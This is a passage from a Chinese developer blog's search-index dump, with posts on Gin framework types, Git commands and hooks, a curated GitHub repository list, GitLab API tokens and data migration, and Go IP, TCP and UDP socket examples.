SkipPaths []string } LoggerConfig用于管理日志配置。\n十四、Negotiate gin/context.go at v1.7.6 · gin-gonic/gin (github.com)\n1 2 3 4 5 6 7 8 9 type Negotiate struct { Offered []string HTMLName string HTMLData interface{} JSONData interface{} XMLData interface{} YAMLData interface{} Data interface{} } Negotiate根据客户端的请求返回不同的响应类型。\n十五、Param gin/tree.go at v1.7.6 · gin-gonic/gin (github.com)\n1 2 3 4 type Param struct { Key string Value string } Param用于存储 url 中的单个查询参数。\n十六、Params gin/tree.go at v1.7.6 · gin-gonic/gin (github.com)\n1 type Params []Param Params用于存储 url 中的所有查询参数。\n十七、RecoveryFunc gin/recovery.go at v1.7.6 · gin-gonic/gin (github.com)\n1 type RecoveryFunc func(c *Context, err interface{}) RecoveryFunc定义可传递给CustomRecovery的函数，用于自定义捕获运行过程中出现的错误。\n十八、ResponseWriter gin/response_writer.go at v1.7.6 · gin-gonic/gin (github.com)\n1 2 3 4 5 6 7 8 9 10 11 12 13 type ResponseWriter interface { http.ResponseWriter http.Hijacker http.Flusher http.CloseNotifier Status() int Size() int WriteString(string) (int, error) Written() bool WriteHeaderNow() Pusher() http.Pusher } ResponseWriter响应返回数据的接口，用于处理 http 响应。\n十九、RouteInfo gin/gin.go at v1.7.6 · gin-gonic/gin (github.com)\n1 2 3 4 5 6 type RouteInfo struct { Method string Path string Handler string HandlerFunc HandlerFunc } RouteInfo用于记录 gin 中对路由处理的信息，包括请求方法、请求路径、处理请求的函数名字以及具体的处理函数。\n二十、RouterGroup gin/routergroup.go at v1.7.6 · gin-gonic/gin (github.com)\n1 2 3 4 5 6 type RouterGroup struct { Handlers HandlersChain basePath string engine *Engine root bool } RouterGroup用于分组路由处理。\n二十一、RoutesInfo gin/gin.go at v1.7.6 · gin-gonic/gin (github.com)\n1 type RoutesInfo []RouteInfo RoutesInfo储存整个服务的路由处理信息。\n总计 概览所有类型，我们可以对所有类型进行一个简单得分类：\n+---------+ +---------+ | Engine | | Context | +----------------+ +---------+ +---------+ | ResponseWriter | +---------------+ | H | +-------------+ | HandlerFunc | | Negotiate | | IRouter | | HandlersChain | +----------------+ | IRoutes | +---------------+ +--------------------+ | RouterInfo | +-----------+ +--------+ | LogConfig | | RoutesInfo | | Error | | Param | | LogFormatterParams | | RouterGroup | | ErrorType | | Params | | LogFormatter | +-------------+ +-----------+ +--------+ +--------------------+ 对这些结构体的大体功能划分清楚后我们就明白了 gin 工作的大体流程，后面再对结合示例对工作细节进行探究学习。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/gin-%E7%B1%BB%E5%9E%8B%E6%A6%82%E8%A7%88/","title":"gin 类型概览"},{"content":"Git 常用操作 1. 强制 pull 覆盖本地 1 2 3 4 5 6 7 8 # 1. 下载远程库的所有内容，但不与本地做任何合并git git fetch --all # 2. 撤销工作区中所有未提交的修改内容，将暂存区与工作区都回到远程仓库最新版本 git reset --hard origin/master # 3. 再更新一次（可用可不用，因为第二次已经更新了） git pull 2. 新建分支并同步到远程 1 2 3 4 5 # 1. 新建本地 develop 分支并切换 git checkout -b develop # 2. 同步到远程分支 git push origin develop:develop 3. 统计提交历史 1 git log --format=\u0026#39;%aN\u0026#39; | sort -u | while read name; do echo -en \u0026#34;$name\\t\u0026#34;; git log --author=\u0026#34;$name\u0026#34; --pretty=tformat: --numstat | awk \u0026#39;{ add += $1; subs += $2; loc += $1 - $2 } END { printf \u0026#34;added lines: %s, removed lines: %s, total lines: %s\\n\u0026#34;, add, subs, loc }\u0026#39; -; done 4. 凭证存储，避免重复输入验证 1 git config --global credential.helper store 5. 版本重置到指定提交 1 2 3 4 5 6 7 8 9 10 11 12 # 1. 查询提交历史版本 git log commit ef42757aa711f4716f8609e46c5618ee4f924dba (HEAD -\u0026gt; dev, origin/dev) ...... # 2. 重置到指定版本 # 移动 Head 并重置暂存区和工作区 git reset --hard ef42757aa711f4716f8609e46c5618ee4f924dba # 移动 Head 但不重置暂存区和工作区 git reset --soft ef42757aa711f4716f8609e46c5618ee4f924dba 6. 强制将本地分支覆盖远程分支 1 git push origin \u0026lt;name\u0026gt; --force ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/git-%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/","title":"Git 常用操作"},{"content":"Git 学习笔记 一、入门使用 包含操作： git init：初始化 git 仓库 git add \u0026lt;file\u0026gt;：添加文件 git commit：提交文件 1 2 3 4 5 6 7 8 9 10 11 12 13 # 1. 创建文件夹 mkdir demo cd demo # 2. 初始化 git 仓库 git init # 3. 新建文件并提交 echo Hello git! \u0026gt;\u0026gt; readme git add readme # 4. 提交修改 git commit -m \u0026#34;创建 readme\u0026#34; Commit Message 规范：\n为了方便我们对提交信息的查找与使用，我们在编写 commit message 时应该遵循一定的规范，社区有多种 Commit message 的 写法规范，我们主要使用Angular 规范，这是使用最为广泛的规范。\n具体的规范要求可以查看：Commit message 和 Change log 编写指南 - 阮一峰的网络日志 (ruanyifeng.com)\n二、工作区和暂存区 我们在电脑中能看到的目录，比如我的demo文件夹就是一个工作区（Working Space）。\n在我们的执行 git init命令的路径下，有一个隐藏目录.git，这个目录就算 git 的版本库。\ngit 的版本库里存了很多东西，其中最重要的就是 **暂存区（stage）**和 git 为我们自动创建的第一个分支master，以及指向master的一个指针叫HEAD。\n我们在执行 git add \u0026lt;file\u0026gt;命令时，git 会将我们添加的文件从工作区添加到暂存区，当我们执行 git commit命令时，又会将文件添加到分支中：\n下面我们通过实践观察 git 的工作流程：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # 1. 在工作区修改 readme 文件并查看状态 echo test \u0026gt;\u0026gt; readme git status output: On branch master Changes not staged for commit: (use \u0026#34;git add \u0026lt;file\u0026gt;...\u0026#34; to update what will be committed) (use \u0026#34;git restore \u0026lt;file\u0026gt;...\u0026#34; to discard changes in working directory) modified: readme no changes added to commit (use \u0026#34;git add\u0026#34; and/or \u0026#34;git commit -a\u0026#34;) # 2. 添加文件到暂存区 git add readme git status output: On branch master Changes to be committed: (use \u0026#34;git restore --staged \u0026lt;file\u0026gt;...\u0026#34; to unstage) modified: readme # 3. 提交文件到分支 git commit -m \u0026#34;test\u0026#34; git status output: On branch master nothing to commit, working tree clean 三、撤销修改 包含操作： git restore：撤销修改\n当我们在工作区修改了文件后，如果我们想撤销修改，回退到之前的版本，那么我们可以使用 git restore命令进行撤销：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # 1. 修改文件 echo study \u0026gt;\u0026gt; readme cat readme output: Hello git! test study # 2. 撤销修改 git restore readme cat readme output: Hello git! test 如果我们执行了 git add操作后，我们想要撤销修改，那么我们也可以使用git restore命令进行撤销：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # 1. 修改文件 echo study \u0026gt;\u0026gt; readme cat readme output: Hello git! test study # 2. 提交到暂存区 git add readme git status output: On branch master Changes to be committed: (use \u0026#34;git restore --staged \u0026lt;file\u0026gt;...\u0026#34; to unstage) modified: readme # 3. 撤销修改 git restore --staged readme git status output: On branch master Changes not staged for commit: (use \u0026#34;git add \u0026lt;file\u0026gt;...\u0026#34; to update what will be committed) (use \u0026#34;git restore \u0026lt;file\u0026gt;...\u0026#34; to discard changes in working directory) modified: readme no changes added to commit (use \u0026#34;git add\u0026#34; and/or \u0026#34;git commit -a\u0026#34;) 四、远程仓库 包含操作：\ngit remote：管理远程仓库 git push：将分支推送到远程仓库 git pull：将远程分支拉到本地\n五、分支管理 分支管理是 git 中最为强大的工具，通过分支管理可以帮助我们实现多人协同工作。\n1. 分支创建与合并 git 为我们默认创建的分支为 master分支，当我们在开发新功能时，我们可以新建一个分支，然后将我们的修改提交到新分支，当我们功能开发完毕后再合并到主分支即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # 1. 创建并切换到新分支 git checkout -b newBranch # 这一步实际上是执行了两个操作 # git branch newBranch # 创建新分支 # git checkout newBranch # 切换到新分支 # 2. 在新分支进行修改 echo newBranch \u0026gt;\u0026gt; readme git add readme git commit -m \u0026#34;newBranch\u0026#34; # 3. 切换回 master 分支 git checkout master cat readme output: Hello git! test study # 此时我们可以发现在新分支做的修改是没有影响到主支的 # 4. 合并新分支到主支 git merge newBranch cat readme output: Hello git! test study newBranch # 新分支的修改已经合并到主分支了 2. 合并冲突 在分支合并时，git 会自动对两个分支的内容进行合并。但是有些时候 git 无法完成两个内容的合并，这个时候就会产生冲突。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 # 1. 对 master 分支的 readme 文件进行修改 cat readme output: Hello git! master git add readme git commit -m \u0026#34;master\u0026#34; # 2. 对 newBranch 分支的文件进行修改 git checkout newBranch cat readme output: Hello git! newBranch git add readme git commit -m \u0026#34;newBranch\u0026#34; # 3. 切换回 master 分支进行合并 git checkout master git merge newBranch output: Auto-merging readme CONFLICT (content): Merge conflict in readme Automatic merge failed; fix conflicts and then commit the result. # 查看状态 git status output: On branch master You have unmerged paths. (fix conflicts and run \u0026#34;git commit\u0026#34;) (use \u0026#34;git merge --abort\u0026#34; to abort the merge) Unmerged paths: (use \u0026#34;git add \u0026lt;file\u0026gt;...\u0026#34; to mark resolution) both modified: readme no changes added to commit (use \u0026#34;git add\u0026#34; and/or \u0026#34;git commit -a\u0026#34;) # 直接查看 readme 文件的内容 catreadme Hello git! \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt; HEAD master ======= newBranch \u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; newBranch # git 为我们标注出了冲突的位置 # 4. 我们对 readme 文件直接进行修改，修改完成后直接提交即可 git add readme git commit -m \u0026#34;Handling conflicts\u0026#34; 3. 状态暂存 我们在使用虚拟机的时候有一个快照功能，我们可以使用它为我们保存虚拟机的快照。当我们虚拟机使用出现问题时，直接恢复快照就可以恢复到原来的状态。\ngit 也有类似于虚拟机快照的功：git stash命令可以保存当前状态和恢复历史状态。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 # 1. 修改文件 echo stash \u0026gt;\u0026gt; readme # 2. 查看当前状态 git status output: On branch master Changes not staged for commit: (use \u0026#34;git add \u0026lt;file\u0026gt;...\u0026#34; to update what will be committed) (use \u0026#34;git restore \u0026lt;file\u0026gt;...\u0026#34; to discard changes in working directory) modified: readme no changes added to commit (use \u0026#34;git add\u0026#34; and/or \u0026#34;git commit -a\u0026#34;) # 3. 保存当前状态 git stash git status output: On branch master nothing to commit, working tree clean # 4. 查看保存的状态 git stash list output: stash@{0}: WIP on master: 84e21d9 Merge branch \u0026#39;newBranch\u0026#39; # 5. 恢复状态 git stash pop stash@{0} # 该命令实际上是执行了两步： # git stash apply stash@{0} # git stash drop stash@{0} # 6. 查看当前状态 git status output: On branch master Changes not staged for commit: (use \u0026#34;git add \u0026lt;file\u0026gt;...\u0026#34; to update what will be committed) (use \u0026#34;git restore \u0026lt;file\u0026gt;...\u0026#34; to discard changes in working directory) modified: readme no changes added to commit (use \u0026#34;git add\u0026#34; and/or \u0026#34;git commit -a\u0026#34;) # 可以发现我们之前保存的状态已经恢复了 六、Git Hooks Git Hooks 是我们在执行某些 git 操作时可以触发的脚本。有了这些脚本可以更帮助我们更方便的进行生产。\ngit hooks 位于 .git/hooks/目录下，如果我们要想启用某个钩子，将钩子文件名改为正确的后缀即可。下面我们尝试写一个 commit-msg （在 commit 操作前触发）的 hook：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # 1. 进入目录 cd .git/hooks/ ls output: applypatch-msg.sample post-update.sample pre-push.sample push-to-checkout.sample pre-applypatch.sample pre-rebase.sample update.sample commit-msg.sample pre-commit.sample pre-receive.sample fsmonitor-watchman.sample pre-merge-commit.sample prepare-commit-msg.sample # 2. 备份 commit-msg.sample 文件 mv commit-msg.sample commit-msg.sample.bak # 3. 编写一个 bash 脚本 vim commit-msg #!/bin/sh echo \u0026#34;using hooks!\u0026#34; # 4. 测试 cd ../../ echo hook \u0026gt;\u0026gt; readme git add readme git commit -m \u0026#34;hooks\u0026#34; output: using hooks! [master bc3f277] hooks 1 file changed, 2 insertions(+) # 可以发现我们的钩子被正确执行了 想了解更多钩子的用户可以参看：githooks(5) (kernel.org)\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/git-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","title":"Git 学习笔记"},{"content":"Github 仓库整理 本篇博客主要对自己感兴趣的 Github 仓库进行简单说明方便查找\n教程 simple-container-network-book：面向网络小白的基础网络和容器网络的科普 TinyWebServer：C++ 实现轻量化 Web 服务器 too-many-lists：《手把手实现 Rust 链表》中文翻译 too-many-lists：《手把手实现 Rust 链表》英文版 LogicStack-LeetCode：公众号「宫水三叶的刷题日记」刷穿 LeetCode 系列文章源码 awesome-adb：ADB 用法大全 lkmpg：Linux 内核模块编程指南（针对 5.0+ 内核更新） cs-self-learning：计算机自学指南 cold：用 Rust 编写的玩具 ELF 链接器 z2o-k7e：ZKP（零知识证明）讲解 developer2gwy：公务员从入门到上岸，最佳程序员公考实践教程 chibicc：小型 C 编译器 codeforces-go：算法竞赛模板库 by 灵茶山艾府 💭💡🎈 hecto-tutorial：使用 Rust 构建文本编辑器 architecture.of.internet-product：互联网公司技术架构 ProxyResource：收集整理并维护的Loon和Clash资源 zero-to-production：《从零构建 RUST 生产级服务》的代码 awesome-cloudflare：Cloudflare 工具、开源项目、指南、博客和其他资源列表 awesome-compose：Docker Compose 示例 vpnservices：安卓vpnservices的使用经验总结 eunomia.dev：eBPF 教程 golang-HiPac-tunnel：高吞吐量的点对点隧道 Demo lb-from-scratch：非常基础的 eBPF 负载均衡器，几行 C 语言 开发工具库 Rust serde：序列化和反序列化库 abi_stable_crates：Rust-to-Rust ffi crossterm：跨平台终端库 quinn：Rust 中的异步友好型 QUIC 实现 chrono：Rust 的日期和时间库 reqwest：Rust HTTP 客户端 actix-web：Rust Web 框架 thiserror：Rust Error 处理库 Go fsnotify：跨平台获取 filesystem notifications netpoll：高性能 NIO(Non-blocking I/O) 网络库，专注于 RPC 场景 screenshot：屏幕截图 mobile：Go 编译移动端 lib dppk：基于素伽罗瓦域 GF 的确定性多项式公钥算法 GF（p） tunny：goroutine pool qpp：Go 实现 Quantum Permutation Pad (QPP) 加密算法 go-redis：Redis Go client EventBus：与 Go 异步兼容的轻量级事件总线 base58：在 Go 中快速实现 base58 编码 netlink：Simple netlink library for go Python DrissionPage：基于 python 的网页自动化工具 psutil：获取进程和系统监控信息的跨平台库 C# reverse-proxy：用于开发高性能 HTTP 反向代理应用程序的工具包 Web direct-sockets：用于 Web 平台的 Direct Sockets API 实用工具 VxKex：允许一些 Windows 8、8.1 和 10 独有的应用程序在 Windows 7 上运行 aria2：下载工具，支持 HTTP/HTTPS、FTP、SFTP、BitTorrent 和 Metalink conceal：基于 noise，通过不安全的通道发送加密文件 MyIP：IP 检测网站 netcap：基于bcc，可对含skb作为参数的系统函数，或者基于DPDK的mbuf抓包分析 SpoofDPI：规避深度包检测的简单工具 zapret：DPI 翻墙工具 GoodbyeDPI：深度数据包检测规避（适用于 Windows） libkcp：FEC 在 C++ 中为 iOS/Android 增强的 KCP 会话库 Follow：RSS 阅读器 cobalt：媒体下载器 lazygit：git 命令的简单终端用户界面 uv：Rust 编写的 Python 包管理器 systrack：分析 Linux 内核映像 （vmlinux） 并提取有关已实现的系统调用的信息 goref：Go 堆对象引用分析工具 TranslationPlugin：用于基于 IntelliJ 的 IDE/Android Studio 的翻译插件 SteamTools： Steam 工具箱 earthworm：通过用连词造句的方法学习英语 DictionaryByGPT4：一本 GPT4 生成的单词书 v2ray-core：翻墙代理工具 chinese-programmer-wrong-pronunciation：中国程序员容易发音错误的单词 server：面向开发人员的屏幕共享工具 ripgrep：递归搜索目录以查找正则表达式模式 rust-memory-container-cs：Rust 备忘单 node_exporter：Prometheus 导出器，用于 *NIX 内核公开的硬件和操作系统指标 everyone-can-use-english：人人都能用英语 iperf：TCP、UDP 和 SCTP 网络带宽测量工具 whydeadcode：显示 Go 链接器部分禁用死码消除的原因 winfsp：FUSE for Windows bumblebee：通过 1 行 bash 获取从云端运行到内核的 eBPF 程序 winlator：使用 Wine 和 Box86/Box64 运行 Windows 应用程序的 Android 应用程序 acme.sh：从 letsencrypt 生成免费的证书 EcoPaste：跨平台的剪贴板管理工具 farm：用 Rust 编写的极快的 Vite 兼容 Web 构建工具 sumatrapdf：PDF 阅读器 hev-socks5-tunnel：Linux tun2socks navidrome：与 Subsonic/Airsonic 兼容的 Modern Music Server 和 Streamer game2048：2048 Android ClashMetaForAndroid：Clash for Android pokerogue：一款基于浏览器的 Pokémon 同人游戏，深受 roguelite 类型的启发 tcpcopy：在线请求复制和 TCP 流重放工具 tun2socks：基于 gVisor 实现的 tun2socks nebula：一个可扩展的叠加网络工具，专注于性能、简单性和安全性 bumblebee：通过 1 行 bash 获取从云端运行到内核的 eBPF 程序 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/github-%E4%BB%93%E5%BA%93%E6%95%B4%E7%90%86/","title":"Github 仓库整理"},{"content":"GitHub 克隆加速 现在 GitHub 在国内处于半墙状态，能否链接上全凭人品。想要快速下载，那么不妨尝试一下下面这个方法！\n我们可以使用 GitHub 的镜像网站 —— github.com.cnpmjs.org 进行克隆。\n将原本的链接中的 github.com 替换为 github.com.cnpmjs.org 即可使下载速度快速提高！\n示例 例如我们要克隆 sqlmap 的仓库：\n原始链接：https://github.com/sqlmapproject/sqlmap.git\n使用原始链接进行克隆：\n结果就是过了半天直接失败了！！\n使用 github.com.cnpmjs.org 替换原始链接：\n替换后的链接：https://github.com.cnpmjs.org/sqlmapproject/sqlmap.git\n兄弟们看到没，这速度，牛逼了啊！！！妈妈再也不怕我上不了全球最大同性交往社区了！\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/github-%E5%85%8B%E9%9A%86%E5%8A%A0%E9%80%9F/","title":"GitHub 克隆加速"},{"content":"gitlab API 访问数据 1. 命令行生成 Personal Access Token 1 2 3 4 5 6 7 8 9 10 11 12 # 输入以下命令进入控制台 gitlab-rails console output: -------------------------------------------------------------------------------- Ruby: ruby 2.7.2p137 (2020-10-01 revision 5445e04352) [x86_64-linux] GitLab: 13.6.3 (857c6c6a6a9) FOSS GitLab Shell: 13.13.0 PostgreSQL: 11.9 -------------------------------------------------------------------------------- Loading production environment (Rails 6.0.3.3) irb(main):001:0\u0026gt; 生成 Token：\n1 2 3 4 user = User.find_by_user(\u0026#39;Administrator\u0026#39;) token = user.personal_access_tokens.create(scopes: [:api, :sudo], name: \u0026#39;Automation token\u0026#39;) token.set_token(\u0026#39;token-string-here12345\u0026#39;) token.save 2. 使用 API 访问接口 示例：\n1 2 # 访问所有 project curl --header \u0026#34;PRIVATE-TOKEN: token-string-here12345\u0026#34; http://127.0.0.1/api/v4/projects | python -m \u0026#34;json.tool\u0026#34; 常用接口：\n查看所有 project： Projects API | GitLab 下载仓库代码：Projects API | GitLab ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/gitlab-api-%E8%AE%BF%E9%97%AE%E6%95%B0%E6%8D%AE/","title":"gitlab API 访问数据"},{"content":"Gitlab 数据迁移 查看 gitlab 服务器版本：\n1 cat /opt/gitlab/embedded/service/gitlab-rails/VERSION 原始仓库 1. 代码仓库数据 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // 1. gitlab 仓库的数据都在这个目录下，存储的方式是按照 Project ID 的hash值进行保存的 cd /var/opt/gitlab/git-data/repositories tree -L 3 . ├── +gitaly │ ├── state │ │ └── @hashed │ │ ├── 6b │ │ └── d4 │ └── tmp └── @hashed ├── 6b │ └── 86 │ ├── 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.git │ └── 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.wiki.git └── d4 └── 73 ├── d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.git └── d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.wiki.git 这里就是仓库的 Project ID： 1 2 3 // 执行下面的命令查看 ID 的哈希值 echo -n 1 | sha256sum 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b 根据其哈希值可以判断是哪个仓库的数据。\n2. 数据打包 1 2 3 4 5 6 7 8 // 2. 对需要的仓库数据进行打包 pwd /var/opt/gitlab/git-data/repositories tar czvf data.tar.gz * // 3. 发送到新仓库 scp data.tar.gz root@host:/var/opt/gitlab/git-data/ 目标仓库 1 2 3 4 5 6 7 8 9 10 11 12 // 1. 进入仓库数据目录 cd /var/opt/gitlab/git-data // 2. 解压原始仓库的数据 mkdir /var/opt/gitlab/git-data/repository-import/new -p tar xf data.tar.gz -C /var/opt/gitlab/git-data/repository-import/new/ // 3. 更改目录归属者，设置归属者为git用户 chown -R git.git /var/opt/gitlab/git-data/repository-import/ // 4. 迁移数据 gitlab-rake gitlab:import:repos[\u0026#39;/var/opt/gitlab/git-data/repository-import/\u0026#39;] 最后刷新 Web 端就可以看到迁移后的仓库了（登录 root 用户查看）。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/gitlab-%E6%95%B0%E6%8D%AE%E8%BF%81%E7%A7%BB/","title":"gitlab 数据迁移"},{"content":"Go IP 套接字编程 ICMP 监听 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; \u0026#34;golang.org/x/net/icmp\u0026#34; ) func main() { // 这里的ipv4地址是指该程序运行的操作系统的网卡地址 netaddr, _ := net.ResolveIPAddr(\u0026#34;ip4\u0026#34;, \u0026#34;127.0.0.1\u0026#34;) // 这里可以指定\u0026#34;网络层协议:子协议\u0026#34;参数，前者可以取ip4/ip6，后者主要有icmp/igmp/tcp/udp/ipv6/icmp conn, _ := net.ListenIP(\u0026#34;ip4:icmp\u0026#34;, netaddr) for { buf := make([]byte, 1024) n, addr, _ := conn.ReadFrom(buf) msg, _ := icmp.ParseMessage(1, buf[0:n]) fmt.Println(n, addr, msg.Type, msg.Code, msg.Checksum) } } TCP 监听 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 package main import ( \u0026#34;bytes\u0026#34; \u0026#34;encoding/binary\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) func main() { netaddr, _ := net.ResolveIPAddr(\u0026#34;ip4\u0026#34;, \u0026#34;172.17.0.3\u0026#34;) // 注意，这里修改了监听协议 conn, _ := net.ListenIP(\u0026#34;ip4:tcp\u0026#34;, netaddr) for { // 缓冲区大小和TCP包大小匹配 buf := make([]byte, 1480) n, addr, _ := conn.ReadFrom(buf) // 这里用别人写好的函数解析了一下TCP首部，默认20字节 tcpheader := NewTCPHeader(buf[0:n]) fmt.Println(n, addr, tcpheader) } } /* Copyright 2013-2014 Graham King This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License (GPLv3) */ type TCPHeader struct { Source uint16 Destination uint16 SeqNum uint32 AckNum uint32 DataOffset uint8 // 4 bits Reserved uint8 // 3 bits ECN uint8 // 3 bits Ctrl uint8 // 6 bits Window uint16 Checksum uint16 // Kernel will set this if it\u0026#39;s 0 Urgent uint16 } // Parse packet into TCPHeader structure func NewTCPHeader(data []byte) *TCPHeader { var tcp TCPHeader r := bytes.NewReader(data) binary.Read(r, binary.BigEndian, \u0026amp;tcp.Source) binary.Read(r, binary.BigEndian, \u0026amp;tcp.Destination) binary.Read(r, binary.BigEndian, \u0026amp;tcp.SeqNum) binary.Read(r, binary.BigEndian, \u0026amp;tcp.AckNum) var mix uint16 binary.Read(r, binary.BigEndian, \u0026amp;mix) tcp.DataOffset = byte(mix \u0026gt;\u0026gt; 12) // top 4 bits tcp.Reserved = byte(mix \u0026gt;\u0026gt; 9 \u0026amp; 7) // 3 bits tcp.ECN = byte(mix \u0026gt;\u0026gt; 6 \u0026amp; 7) // 3 bits tcp.Ctrl = byte(mix \u0026amp; 0x3f) // bottom 6 bits binary.Read(r, binary.BigEndian, \u0026amp;tcp.Window) binary.Read(r, binary.BigEndian, \u0026amp;tcp.Checksum) binary.Read(r, binary.BigEndian, \u0026amp;tcp.Urgent) return \u0026amp;tcp } func (tcp *TCPHeader) String() string { if tcp == nil { return \u0026#34;\u0026lt;nil\u0026gt;\u0026#34; } return fmt.Sprintf(\u0026#34;Source=%v Destination=%v SeqNum=%v AckNum=%v DataOffset=%v Reserved=%v ECN=%v Ctrl=%v Window=%v Checksum=%v Urgent=%v\u0026#34;, tcp.Source, tcp.Destination, tcp.SeqNum, tcp.AckNum, tcp.DataOffset, tcp.Reserved, tcp.ECN, tcp.Ctrl, tcp.Window, tcp.Checksum) } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/go-ip-%E5%A5%97%E6%8E%A5%E5%AD%97%E7%BC%96%E7%A8%8B/","title":"Go IP 套接字编程"},{"content":"Go TCP 编程 Server 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 package main import ( \u0026#34;bufio\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) func main() { listen, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;127.0.0.1:12345\u0026#34;) if err != nil { fmt.Println(\u0026#34;listen failed, err:\u0026#34;, err) return } for { conn, err := listen.Accept() // 建立连接 if err != nil { fmt.Println(\u0026#34;accept failed, err:\u0026#34;, err) continue } go process(conn) } } func process(conn net.Conn) { defer conn.Close() // 关闭连接 for { reader := bufio.NewReader(conn) var buf [1024]byte n, err := reader.Read(buf[:]) if err != nil { fmt.Println(\u0026#34;read from client failed, err:\u0026#34;, err) break } fmt.Println(\u0026#34;recv from client：\u0026#34;, string(buf[:n])) conn.Write(buf[:n]) } } Client 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) func main() { conn, err := net.Dial(\u0026#34;tcp\u0026#34;, \u0026#34;127.0.0.1:12345\u0026#34;) if err != nil { fmt.Println(\u0026#34;err :\u0026#34;, err) return } defer conn.Close() for { _, err = conn.Write([]byte(\u0026#34;hello world\u0026#34;)) // 发送数据 if err != nil { return } buf := [512]byte{} n, err := conn.Read(buf[:]) if err != nil { panic(err) return } fmt.Println(string(buf[:n])) } } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/go-tcp-%E7%BC%96%E7%A8%8B/","title":"Go TCP 编程"},{"content":"Go UDP 编程 CS 模型 Server：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) func main() { listen, err := net.ListenUDP(\u0026#34;udp\u0026#34;, \u0026amp;net.UDPAddr{IP: net.ParseIP(\u0026#34;127.0.0.1\u0026#34;), Port: 12345}) if err != nil { fmt.Println(err) return } fmt.Printf(\u0026#34;Local: \u0026lt;%s\u0026gt; \\n\u0026#34;, listen.LocalAddr().String()) data := make([]byte, 1024) for { n, remoteAddr, err := listen.ReadFromUDP(data) if err != nil { fmt.Printf(\u0026#34;error during read: %s\u0026#34;, err) } fmt.Printf(\u0026#34;\u0026lt;%s\u0026gt; %s\\n\u0026#34;, remoteAddr, data[:n]) _, err = listen.WriteToUDP([]byte(\u0026#34;world\u0026#34;), remoteAddr) if err != nil { fmt.Printf(err.Error()) } } } Client：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) func main() { dstAddr := \u0026amp;net.UDPAddr{IP: net.ParseIP(\u0026#34;127.0.0.1\u0026#34;), Port: 12345} conn, err := net.DialUDP(\u0026#34;udp\u0026#34;, nil, dstAddr) if err != nil { fmt.Println(err) } defer conn.Close() conn.Write([]byte(\u0026#34;hello\u0026#34;)) fmt.Printf(\u0026#34;\u0026lt;%s\u0026gt;\\n\u0026#34;, conn.RemoteAddr()) } 等价节点 由于 UDP socket 是一个二元组，因为我们可以监听本地套接字，因此可以接收任意地址来的包，也可以向任意地址发包。\n双端都监听本地套接字，并接收任意地址的包，因此双端此时都是一个等价的节点。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) func main() { listen, err := net.ListenUDP(\u0026#34;udp\u0026#34;, 